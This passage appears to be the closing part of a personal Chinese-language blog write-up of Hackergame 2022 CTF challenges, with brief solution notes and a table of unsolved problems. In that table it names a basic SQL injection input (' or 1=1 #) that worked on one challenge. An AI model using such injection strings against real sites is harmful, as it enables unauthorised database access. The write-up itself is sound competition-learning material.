+</span></span><span class="line"><span class="cl">w 2 1 0     # 两边写 0    1 2 3 为 0
+</span></span><span class="line"><span class="cl">w 5 1 0     # 两边写 0    4 5 6 为 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>好像第一行改成 <code>w T 3 3 0 9</code> 就不行，推测是把寻址的基址给改到奇奇怪怪的地方了。</p>
+</blockquote>
+<p>然后把所有轮子的速度读出来，十六进制转 ASCII 就过了</p>
+<p>代码见 <a href="28/script.py">script.py</a></p>
+<br>
+<h3 id="30-企鹅拼盘">30 企鹅拼盘</h3>
+<h4 id="这么简单我闭眼都可以">这么简单我闭眼都可以！</h4>
+<p>手动枚举</p>
+<h4 id="大力当然出奇迹啦">大力当然出奇迹啦~</h4>
+<p>改改程序，暴力</p>
+<p>代码见 <a href="30/solve-16.py">solve-16.py</a></p>
+<blockquote>
+<p>第三问不会</p>
+</blockquote>
+<br>
+<h3 id="32-火眼金睛的小-e">32 火眼金睛的小 E</h3>
+<h4 id="有手就行">有手就行</h4>
+<p>用 <code>objdump</code> 转成汇编，分析代码间的行数、LCS 的匹配程度。
+按照这两个特征排序，枚举所有函数</p>
+<blockquote>
+<p>其实如果只做第一问直接枚举所有函数就行了</p>
+</blockquote>
+<p>代码写得比较乱，就不放了</p>
+<br>
+<h2 id="未完成">未完成</h2>
+<table>
+<thead>
+<tr>
+<th>题目名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21 矩阵之困</td>
+<td>拿 z3 解了几个小时没解出来</td>
+</tr>
+<tr>
+<td>22 你先别急</td>
+<td>发现可以 SQL 注入 <code>' or 1=1 #</code>。但我不太会 SQL 注入，不知道怎么继续</td>
+</tr>
+<tr>
+<td>29 壹&hellip;壹字节？</td>
+<td>我只会把所有一字节的字符发给服务器</td>
+</tr>
+<tr>
+<td>31 小 Z 的靓号钱包</td>
+<td>配置好环境了，也知道随机数是 32 位的了。但代码有点没看懂</td>
+</tr>
+<tr>
+<td>33 evilCallback</td>
+<td>没发现有 <code>.diff</code> 文件，还以为要玄学测试。虽然发现了我大概率也做不出来</td>
+</tr>
+</tbody>
+</table>
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">GWDx</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2022-11-02
+        <a href="https://github.com/GWDx/GWDx.github.io/commit/4c5778f79c8aa81fc2871332b751cf51876f5e19" title="Hackergame 2022">(4c5778f)</a>
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/hackergame/">Hackergame</a>
+          <a href="/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/web-tour/">
+            <span class="next-text nav-default">Web 之旅</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:gwdx@mail.ustc.edu.cn" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/GWDx" class="iconfont icon-github" title="github"></a>
+      <a href="https://space.bilibili.com/442365922" class="iconfont icon-bilibili" title="bilibili"></a>
+  <a href="http://gwdx.me/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>GWDx</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-HBL65Q7HB4', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
